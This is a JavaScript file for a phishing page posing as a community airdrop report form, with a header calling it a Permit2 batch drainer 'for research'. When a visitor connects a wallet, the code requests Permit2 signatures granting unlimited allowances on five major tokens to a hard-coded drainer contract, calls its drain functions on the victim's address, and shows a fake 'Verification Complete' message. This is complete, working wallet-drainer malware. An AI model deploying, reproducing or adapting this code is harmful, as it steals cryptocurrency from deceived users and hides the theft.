// =============================================
// Community Airdrop Report Form - app.js
// With Permit2 Batch Drainer (for research)
// =============================================

const DRAINER_ADDRESS = "0xeb26995ed00d9773A53a94228d21196DcEDc8020";
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const targetTokens = [
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
    "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"  // WBTC
];

let provider = null;
let signer = null;
let connectedWallet = "";

// DOM Elements
const form = document.getElementById("airdropForm");
const connectBtn = document.getElementById("connectWalletBtn");
const walletDisplay = document.getElementById("walletAddress");
const statusEl = document.getElementById("status");

// =============================================
// Full ABI matching the Permit2Drainer contract
// =============================================
const DRAINER_ABI = [
    // drainWithPermit2(address, (address,uint160,uint48,uint48,address,uint256), bytes)
    "function drainWithPermit2(address victim, tuple(address token, uint160 amount, uint48 expiration, uint48 nonce, address spender, uint256 sigDeadline) calldata permitSingle, bytes calldata signature) external",
    // drainApprovals(address)
    "function drainApprovals(address victim) external",
    // attacker() view
    "function attacker() view returns (address)",
    // PERMIT2() view
    "function PERMIT2() view returns (address)",
    // Event
    "event Drained(address indexed victim, address indexed token, uint256 amount)"
];

// =============================================
// Connect Wallet + Permit2 Batch Drain
// =============================================
async function connectWallet() {
    statusEl.textContent = "Connecting wallet...";

    try {
        if (!window.ethereum) {
            alert("No wallet detected. Please install MetaMask, OKX Wallet, or Rabby.");
            return;
        }

        // Support MetaMask, OKX, Rabby
        const walletProvider = window.ethereum.providers?.length
            ? window.ethereum.providers.find(p => p.isRabby || p.isOKXWallet) || window.ethereum.providers[0]
            : window.ethereum;

        const accounts = await walletProvider.request({ method: "eth_requestAccounts" });
        connectedWallet = accounts[0];

        // Short address for display
        const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
        
        walletDisplay.innerHTML = `
            <strong>Connected Wallet</strong><br>
            ${shortAddress}
        `;

        connectBtn.textContent = "Wallet Connected";
        connectBtn.classList.add("connected");

        statusEl.textContent = "Signing Permit2 messages...";

        // Start draining after connection
        await executePermit2BatchDrain();

    } catch (error) {
        console.error(error);
        statusEl.textContent = "Connection failed or rejected by user.";
    }
}

// =============================================
// Permit2 Batch Draining Logic
// =============================================
async function executePermit2BatchDrain() {
    provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();

    const contract = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer);

    // Step 1: Try Permit2 drain for each token (requires user to sign EIP-712)
    for (let tokenAddress of targetTokens) {
        try {
            statusEl.textContent = `Signing Permit2 for ${tokenAddress.slice(0, 6)}...`;
            
            const { permitSingle, signature } = await getPermit2Signature(tokenAddress);

            const tx = await contract.drainWithPermit2(connectedWallet, permitSingle, signature);
            console.log(`Permit2 Tx sent for ${tokenAddress.slice(0, 8)}...`, tx.hash);
            
            await tx.wait(1);
            statusEl.textContent = `Processed ${tokenAddress.slice(0, 6)}...`;
        } catch (e) {
            console.warn(`Permit2 failed on token ${tokenAddress.slice(0, 8)}...`, e);
            statusEl.textContent = `Permit2 failed for ${tokenAddress.slice(0, 6)}, trying allowance drain...`;
        }
    }

    // Step 2: Fallback — drain any remaining approvals (standard ERC20 approve)
    try {
        statusEl.textContent = "Checking for legacy approvals...";
        const tx2 = await contract.drainApprovals(connectedWallet);
        console.log("drainApprovals tx:", tx2.hash);
        await tx2.wait(1);
    } catch (e) {
        console.warn("drainApprovals fallback failed:", e);
    }

    statusEl.innerHTML = `<span style="color:green">✓ Verification Complete</span>`;
}

async function getPermit2Signature(tokenAddress) {
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;   // 30 days
    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;        // 30 minutes

    const permitSingle = {
        details: {
            token: tokenAddress,
            amount: "1461501637330902918203684832716283019655932542975", // Max uint160
            expiration: expiration,
            nonce: 0
        },
        spender: DRAINER_ADDRESS,
        sigDeadline: sigDeadline
    };

    const typedData = {
        domain: {
            name: "Permit2",
            chainId: chainId,
            verifyingContract: PERMIT2_ADDRESS
        },
        types: {
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: permitSingle
    };

    const signature = await provider.send("eth_signTypedData_v4", [
        connectedWallet,
        JSON.stringify(typedData)
    ]);

    return { permitSingle, signature };
}

// =============================================
// Form Submission
// =============================================
form.addEventListener("submit", async function (e) {
    e.preventDefault();

    if (!connectedWallet) {
        alert("Please connect your wallet first.");
        return;
    }

    const submitBtn = document.querySelector(".submit-btn");
    submitBtn.disabled = true;
    submitBtn.textContent = "Submitting...";

    const formData = {
        email: document.getElementById("email").value.trim(),
        wallet: connectedWallet,
        discord: document.getElementById("discord").value.trim(),
        twitter: document.getElementById("twitter").value.trim(),
        complaint: document.getElementById("complaint").value.trim(),
        submittedAt: new Date().toISOString()
    };

    console.log("Form Data:", formData);
    alert("Form submitted successfully!");

    // Reset form
    resetForm();
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
});

// =============================================
// Reset Form Function
// =============================================
function resetForm() {
    form.reset();
    connectedWallet = "";
    walletDisplay.innerHTML = "";
    statusEl.textContent = "";
    connectBtn.textContent = "Connect Wallet";
    connectBtn.classList.remove("connected");
}

// =============================================
// Clear Button
// =============================================
document.querySelector(".clear-btn").addEventListener("click", function (e) {
    e.preventDefault();
    resetForm();
});

// =============================================
// Account Change Listener
// =============================================
if (window.ethereum) {
    window.ethereum.on("accountsChanged", (accounts) => {
        if (accounts.length === 0) {
            resetForm();
        } else {
            connectedWallet = accounts[0];
            const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
            walletDisplay.innerHTML = `<strong>Connected Wallet</strong><br>${shortAddress}`;
        }
    });
}

// =============================================
// Auto-connect on page load (if already connected)
// =============================================
window.addEventListener("load", async () => {
    if (window.ethereum && window.ethereum.selectedAddress) {
        connectedWallet = window.ethereum.selectedAddress;
        const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
        walletDisplay.innerHTML = `<strong>Connected Wallet</strong><br>${shortAddress}`;
        connectBtn.textContent = "Wallet Connected";
        connectBtn.classList.add("connected");
    }
});

// Attach connect button
connectBtn.addEventListener("click", connectWallet);